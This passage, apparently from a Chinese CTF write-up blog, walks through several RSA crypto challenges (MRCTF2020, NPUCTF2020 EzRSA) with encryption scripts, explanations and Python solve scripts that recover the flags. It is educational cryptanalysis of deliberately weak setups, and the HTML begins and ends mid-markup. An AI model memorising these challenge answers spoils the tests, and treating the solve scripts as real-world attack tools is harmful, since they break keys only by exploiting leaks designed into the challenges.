class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd, invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, getRandomNBitInteger, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&quot;MRCTF&#123;xxxx&#125;&quot;</span></span><br><span class="line">base = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">A</span>):</span><br><span class="line">    B = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(A)):</span><br><span class="line">        B = gcd(A[i-<span class="number">1</span>], A[i])</span><br><span class="line">    <span class="keyword">return</span> B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_p</span>():</span><br><span class="line">    P = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>)]</span><br><span class="line">    P[<span class="number">0</span>] = getPrime(<span class="number">128</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line">        P[i] = sympy.nextprime(P[i-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;P_p :&quot;</span>, P[<span class="number">9</span>])</span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">        n *= P[i]</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    factor = <span class="built_in">pow</span>(p, base, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;P_factor :&quot;</span>, factor)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_q</span>():</span><br><span class="line">    sub_Q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    Q_1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    Q_2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    Q = sub_Q ** Q_2 % Q_1</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Q_1: &quot;</span>, Q_1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Q_2: &quot;</span>, Q_2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sub_Q: &quot;</span>, sub_Q)</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(Q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    _E = base</span><br><span class="line">    _P = gen_p()</span><br><span class="line">    _Q = gen_q()</span><br><span class="line">    <span class="keyword">assert</span> (gcd(_E, (_P - <span class="number">1</span>) * (_Q - <span class="number">1</span>)) == <span class="number">1</span>)</span><br><span class="line">    _M = bytes_to_long(flag)</span><br><span class="line">    _C = <span class="built_in">pow</span>(_M, _E, _P * _Q)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Ciphertext = &quot;</span>, _C)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">P_p : 206027926847308612719677572554991143421</span></span><br><span class="line"><span class="string">P_factor : 213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839</span></span><br><span class="line"><span class="string">Q_1:  103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521</span></span><br><span class="line"><span class="string">Q_2:  151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743</span></span><br><span class="line"><span class="string">sub_Q:  168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651</span></span><br><span class="line"><span class="string">Ciphertext =  1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>​注意到上面的加密过程给出的q相关的数据比较多，解q也比较简单，直接求一下<code>Q = sub_Q ** Q_2 % Q_1</code>然后求一下<code>sympy.nextprime(Q)</code>即可。</p><p>​再看p，p是直接<code>p = getPrime(1024)</code>获取的，但是给出了加密后的m<code>factor = pow(p, base, n)</code>，只要求出来n与d即可，前面给出的<code>P_p</code>提示即可求出来所有的元素，从而可以获得p。</p><p>​编写解密脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">base = <span class="number">65537</span></span><br><span class="line">P_p = <span class="number">206027926847308612719677572554991143421</span></span><br><span class="line">P_factor = <span class="number">213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839</span></span><br><span class="line">Q_1 = <span class="number">103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521</span></span><br><span class="line">Q_2 = <span class="number">151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743</span></span><br><span class="line">sub_Q = <span class="number">168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651</span></span><br><span class="line">Ciphertext =  <span class="number">1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求q</span></span><br><span class="line">Q = <span class="built_in">pow</span>(sub_Q, Q_2, Q_1) <span class="comment"># sub_Q ** Q_2 % Q_1</span></span><br><span class="line">q = sympy.nextprime(Q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求p</span></span><br><span class="line">P = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>)]</span><br><span class="line">P[<span class="number">9</span>] = P_p</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    P[<span class="number">8</span> - i] = sympy.prevprime(P[<span class="number">9</span> - i])  <span class="comment"># prevprime是求当前素数的前面一个素数的函数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">17</span>):</span><br><span class="line">    P[i] = sympy.nextprime(P[i - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">_n = <span class="number">1</span></span><br><span class="line">_phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    _n *= P[i]</span><br><span class="line">    _phi *= (P[i] - <span class="number">1</span>)</span><br><span class="line">_d = gmpy2.invert(base, _phi)</span><br><span class="line">p = <span class="built_in">pow</span>(P_factor, _d, _n)</span><br><span class="line">p = sympy.nextprime(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(base, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(Ciphertext, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;MRCTF&#123;sti11_@_b@by_qu3st10n&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="NPUCTF2020-EzRSA"><a href="#NPUCTF2020-EzRSA" class="headerlink" title="[NPUCTF2020]EzRSA"></a>[NPUCTF2020]EzRSA</h4><p><strong>TAG：给出p-1、q-1的最小公倍数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> lcm, powmod, invert, gcd, mpz</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">gift = lcm(p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">54722</span></span><br><span class="line">flag = <span class="string">b&#x27;NPUCTF&#123;******************&#125;&#x27;</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">c = powmod(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n: &#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift: &#x27;</span>, gift)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c: &#x27;</span>, c)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121</span></span><br><span class="line"><span class="string">gift = 2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104</span></span><br><span class="line"><span class="string">c = 3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>给出的gift可以看到是非常接近于n的，而这个最小公倍数的最大值为<code>(p-1)*(q-1)</code>，是不可能比n更大的，所以这里我们可以尝试对<code>(p-1)*(q-1)</code>也就是<code>phi</code>进行爆破，下面写出解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> lcm, powmod, invert, gcd, mpz, isqrt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p = getPrime(1024)</span></span><br><span class="line"><span class="string">q = getPrime(1024)</span></span><br><span class="line"><span class="string">n = p * q</span></span><br><span class="line"><span class="string">gift = lcm(p - 1, q - 1)</span></span><br><span class="line"><span class="string">e = 54722</span></span><br><span class="line"><span class="string">flag = b&#x27;NPUCTF&#123;******************&#125;&#x27;</span></span><br><span class="line"><span class="string">m = int.from_bytes(flag, &#x27;big&#x27;)</span></span><br><span class="line"><span class="string">c = powmod(m, e, n)</span></span><br><span class="line"><span class="string">print(&#x27;n: &#x27;, n)</span></span><br><span class="line"><span class="string">print(&#x27;gift: &#x27;, gift)</span></span><br><span class="line"><span class="string">print(&#x27;c: &#x27;, c)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">n = <span class="number">17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121</span></span><br><span class="line">gift = <span class="number">2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104</span></span><br><span class="line">c = <span class="number">3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319</span></span><br><span class="line">e = <span class="number">54722</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">bin</span>(gift)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">8</span>):</span><br><span class="line">    phi = gift * i</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        d = invert(e // <span class="number">2</span>, phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, <span class="built_in">int</span>(d), n)</span><br><span class="line">        flag = long_to_bytes(isqrt(m))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NPUCTF&#123;diff1cult_rsa_1s_e@sy&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>这个范围<code>[4, 8]</code>的原因是gift是2045bit，phi是2048位。而phi &#x3D; lcm * gcd，<code>乘积(2048)=最小公倍数(2045)*最大公约数(3)</code>。故gcd的值为三个比特位，即<code>[4, 8]</code>。</p><p>而e不是素数，无法求出invert，这里把<code>e//2</code>，再将<code>m开平方</code>即可。</p><h4 id="MRCTF2020-Easy-RSA"><a href="#MRCTF2020-Easy-RSA" class="headerlink" title="[MRCTF2020]Easy_RSA"></a>[MRCTF2020]Easy_RSA</h4><p>给出的加密脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd, invert</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, getRandomNBitInteger, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&quot;MRCTF&#123;XXXX&#125;&quot;</span></span><br><span class="line">base = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">N</span>):</span><br><span class="line">    A = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        A = getPrime(N)</span><br><span class="line">        <span class="keyword">if</span> A % <span class="number">8</span> == <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_p</span>():</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">assert</span> (p &lt; q)</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;P_n = &quot;</span>, n)</span><br><span class="line">    F_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;P_F_n = &quot;</span>, F_n)</span><br><span class="line">    factor2 = <span class="number">2021</span> * p + <span class="number">2020</span> * q</span><br><span class="line">    <span class="keyword">if</span> factor2 &lt; <span class="number">0</span>:</span><br><span class="line">        factor2 = (-<span class="number">1</span>) * factor2</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(factor2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_q</span>():</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">assert</span> (p &lt; q)</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Q_n = &quot;</span>, n)</span><br><span class="line">    e = getRandomNBitInteger(<span class="number">53</span>)</span><br><span class="line">    F_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> gcd(e, F_n) != <span class="number">1</span>:</span><br><span class="line">        e = getRandomNBitInteger(<span class="number">53</span>)</span><br><span class="line">    d = invert(e, F_n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Q_E_D = &quot;</span>, e * d)</span><br><span class="line">    factor2 = <span class="number">2021</span> * p - <span class="number">2020</span> * q</span><br><span class="line">    <span class="keyword">if</span> factor2 &lt; <span class="number">0</span>:</span><br><span class="line">        factor2 = (-<span class="number">1</span>) * factor2</span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(factor2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    _E = base</span><br><span class="line">    _P = gen_p()</span><br><span class="line">    _Q = gen_q()</span><br><span class="line">    <span class="keyword">assert</span> (gcd(_E, (_P - <span class="number">1</span>) * (_Q - <span class="number">1</span>)) == <span class="number">1</span>)</span><br><span class="line">    _M = bytes_to_long(flag)</span><br><span class="line">    _C = <span class="built_in">pow</span>(_M, _E, _P * _Q)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Ciphertext = &quot;</span>, _C)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">P_n =  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693</span></span><br><span class="line"><span class="string">P_F_n =  14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740</span></span><br><span class="line"><span class="string">Q_n =  20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947</span></span><br><span class="line"><span class="string">Q_E_D =  100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201</span></span><br><span class="line"><span class="string">Ciphertext =  40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这里用到了有<code>e*d</code>和<code>n</code>求<code>phi</code>、有<code>phi</code>和<code>n</code>如何求<code>p、q</code>。注意，p和q的大小的问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P_n =  <span 